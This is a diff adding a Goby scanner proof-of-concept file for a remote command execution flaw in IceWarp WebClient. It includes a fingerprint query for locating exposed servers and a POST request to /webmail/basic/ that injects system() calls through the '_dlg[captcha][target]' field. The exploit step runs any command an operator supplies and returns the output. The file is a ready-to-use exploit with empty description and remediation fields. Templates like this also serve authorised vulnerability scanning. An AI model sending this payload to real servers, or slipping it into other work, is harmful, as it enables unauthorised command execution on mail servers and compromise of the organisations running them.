@@ -1,0 +1,86 @@
+{
+      "Name": "IceWarp WebClient basic RCE",
+      "Level": "3",
+      "Tags": [],
+      "GobyQuery": "body=\"Powered by IceWarp\"",
+      "Description": "",
+      "Product": "",
+      "Homepage": "https://gobies.org/",
+      "Author": "luckying",
+      "Impact": "",
+      "Recommandation": "",
+      "References": [
+            "https://gobies.org/"
+      ],
+	  "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "cmd",
+			"type": "input",
+			"value": "ipconfig",
+			"show": ""
+		}
+	  ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/webmail/basic/",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "_dlg[captcha][target]=system(\\'ipconfig\\')\\"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "Windows IP",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/webmail/basic/",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "_dlg[captcha][target]=system(\\'{{{cmd}}}\\')\\"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "Windows IP",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+      ],
+      "PostTime": "2021-06-19 13:19:47",
+      "GobyVersion": "1.8.268"
+}
